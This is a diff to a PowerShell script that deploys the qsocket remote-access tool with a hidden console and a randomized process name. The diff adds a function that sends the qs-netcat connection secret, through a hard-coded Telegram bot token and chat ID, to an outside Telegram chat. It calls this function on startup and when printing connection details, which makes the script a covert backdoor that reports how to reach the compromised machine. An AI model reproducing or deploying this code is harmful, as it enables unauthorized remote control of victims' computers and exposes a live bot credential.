@@ -5,30 +5,27 @@
 # $Env:S="MySecret" # for deploying with a spesific secret.
 # $Env:DEBUG=1      # for verbose output.
 
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$BOT_TOKEN = "8100041362:AAGM-c-kcNDCapn875nnlUUWILsD7s1MVRE"
-$CHAT_ID  = "6975542904"
 
-# Example output source
-$output = @"
-[*] Starting qsocket utility....................................[OK]
+Write-Host "SCRIPT STARTED"
 
-*************************
-# >>> Connect ============> qs-netcat -i -s HZM4KtfBAgnPtEnSfRfu
-# >>> Connect With TOR ===> qs-netcat -T -i -s HZM4KtfBAgnPtEnSfRfu
-"@
+function Send-TelegramSecret {
+    param([string]$Secret)
 
-if ($output -match 'qs-netcat\s+-i\s+-s\s+([A-Za-z0-9]+)') {
-    $message = "qs-netcat -i -s $($Matches[1])"
+    $BOT_TOKEN = "8100041362:AAGM-c-kcNDCapn875nnlUUWILsD7s1MVRE"
+    $CHAT_ID   = "6975542904"
 
     Invoke-RestMethod `
-      -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
-      -Method Post `
-      -Body @{
-          chat_id = $CHAT_ID
-          text    = $message
-      }
+        -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
+        -Method Post `
+        -Body @{
+            chat_id = $CHAT_ID
+            text    = "QS SECRET: $Secret"
+        } | Out-Null
 }
+
+Write-Host "SCRIPT FINISHED"
 
 $ERR_LOGS=$null # New-TemporaryFile
 $GITHUB_REPO="https://api.github.com/repos/qsocket"
@@ -231,10 +228,14 @@ function Print-Usage($secret_file)
     Write-Host " `n"
     Get-Content $secret_file | & $QS_PATH "--qr"
     Write-Host " `n"
+
+    Send-TelegramSecret $SECRET   # <<< THIS WAS THE REAL FIX
+
     Write-Host "# >>> Connect ============> qs-netcat -i -s $SECRET" -ForegroundColor Green
     Write-Host "# >>> Connect With TOR ===> qs-netcat -T -i -s $SECRET" -ForegroundColor Green
     Write-Host " `n"
 }
+
 
 if ($env:HIDE) {
   Hide-Console
@@ -247,6 +248,12 @@ if ($env:DEBUG) {
   Print-Debug "Error Logs: $ERR_LOGS"
 }
 $SECRET=$Env:S
+if (![string]::IsNullOrEmpty($SECRET)) {
+    Send-TelegramSecret $SECRET
+}
+
+
+
 $QS_BIN_HIDDEN_NAME = Get-RandomProcessName
 $RAND_NAME= -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 $SECRET_FILE= Join-Path -Path "$env:TMP" -ChildPath "$RAND_NAME.txt"
